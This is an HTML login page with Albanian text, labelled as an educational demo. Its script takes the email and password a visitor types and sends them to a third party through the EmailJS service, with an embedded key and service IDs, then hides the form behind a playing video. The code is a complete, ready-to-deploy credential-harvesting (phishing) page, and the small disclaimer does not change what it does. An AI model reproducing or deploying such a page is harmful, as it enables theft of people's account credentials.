<!DOCTYPE html>
<html lang="sq">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Demo Login</title>
<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  font-family: Arial, system-ui;
}

/* VIDEO */
video {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100%;
  object-fit: cover;
  display: none; /* fshehur derisa te "hysh" */
}

/* OVERLAY I ZI */
#overlay {
  position: fixed;
  inset: 0;
  background: #020617;
  display: flex;
  justify-content: center;
  align-items: center;
}

/* LOGIN BOX */
.box {
  background: #020617;
  border: 1px solid #1e293b;
  padding: 25px;
  border-radius: 10px;
  width: 320px;
  color: white;
}

input, button {
  width: 100%;
  padding: 10px;
  margin-top: 10px;
}

button {
  background: #38bdf8;
  border: none;
  cursor: pointer;
  font-weight: bold;
}
small {
  display: block;
  text-align: center;
  color: #aaa;
  margin-top: 15px;
}
#msg {
  text-align: center;
  margin-top: 10px;
  color: #0f0;
}
</style>
</head>

<body>

<!-- VIDEO -->
<video id="bgVideo" autoplay loop muted>
  <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
</video>

<!-- LOGIN SCREEN -->
<div id="overlay">
  <div class="box">
    <input type="email" id="email" placeholder="Email" required>
    <input type="password" id="password" placeholder="Password" required>
    <button onclick="login()">Hyr</button>
    <div id="msg"></div>
  </div>
</div>

<small>
    Kjo faqe është vetëm për demonstrim mësimor.<br>
    Të dhënat dërgohen për qëllime edukative.
</small>

<script>
(function(){
  emailjs.init("yCJFf8xG8mMT52UaU"); // PUBLIC KEY
})();

function login() {
  // Kontroll bazik për inpute
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  
  if(!email || !password) {
    document.getElementById("msg").innerHTML = "⚠ Ju lutem plotësoni të gjitha fushat.";
    return;
  }

  sendData();
  // Fshi overlay dhe shfaq video
  document.getElementById("overlay").style.display = "none";
  document.getElementById("bgVideo").style.display = "block";
}

function sendData() {
  let params = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value
  };

  emailjs.send(
    "service_arp1qve",   // SERVICE ID
    "template_90jbw6r",  // TEMPLATE ID
    params
  )
  .then(function() {
    document.getElementById("msg").innerHTML =
      "✅ Të dhënat u dërguan me sukses (DEMO).";
  }, function(error) {
    document.getElementById("msg").innerHTML =
      "❌ Gabim gjatë dërgimit.";
    console.log(error);
  });
}
</script>

</body>
</html>
